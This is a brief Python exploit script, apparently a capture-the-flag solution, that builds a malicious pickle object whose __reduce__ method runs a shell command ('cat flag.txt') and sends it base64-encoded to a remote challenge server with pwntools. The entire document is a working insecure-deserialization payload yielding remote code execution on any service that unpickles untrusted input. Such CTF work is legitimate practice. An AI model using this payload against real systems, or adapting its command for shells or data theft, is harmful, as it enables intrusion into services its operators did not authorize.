#!/usr/bin/env python3
from pwn import *
import pickle, base64, subprocess

# Shamelessly lifted from this article 
# https://medium.com/@estheresom17/breaking-pickle-how-i-got-remote-code-execution-through-python-deserialization-e579637fcb2e
class Exploit(object):
    def __reduce__(self):
        return (
            subprocess.check_output,
            (["/bin/sh", "-c", "cat flag.txt"],)
        )

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
r = remote("chals.disorientation.cssa.club", 1571)
r.sendline(payload.encode())
print(r.recvall(timeout=2).decode(errors="ignore"))
